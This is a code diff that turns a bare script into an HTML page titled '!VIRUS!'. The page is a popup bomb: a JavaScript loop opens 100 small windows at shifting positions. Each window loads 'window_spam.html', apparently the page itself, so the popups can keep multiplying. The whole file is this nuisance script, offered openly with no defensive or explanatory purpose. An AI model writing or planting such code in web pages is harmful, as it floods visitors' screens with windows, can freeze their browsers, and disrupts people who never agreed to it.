@@ -1,16 +1,23 @@
-<script>
-    var x = 0
-    var y = 0
-    var nwindow = 0
+<html>
+    <head>
+        <title>!VIRUS!</title>
+    </head>
+    <body>
+        <script>
+            var x = 0
+            var y = 0
+            var nwindow = 0
 
-    var i = 0
-    while (i < 100) {
-        i+=1
-        x+=10
-        y+=10
-        nwindow +=1
-        popup=window.open("","popup" + String(nwindow),"width=200,height=200,screenX=" + String(x) + ",screenY=" + String(y))
-    }
-    window.close()
-    
-</script>
+            var i = 0
+            while (i < 100) {
+                i+=1
+                x+=10
+                y+=10
+                nwindow +=1
+                popup=window.open("window_spam.html","popup" + String(nwindow),"width=200,height=200,screenX=" + String(x) + ",screenY=" + String(y))
+            }
+            window.close()
+            
+        </script>
+    </body>
+</html>
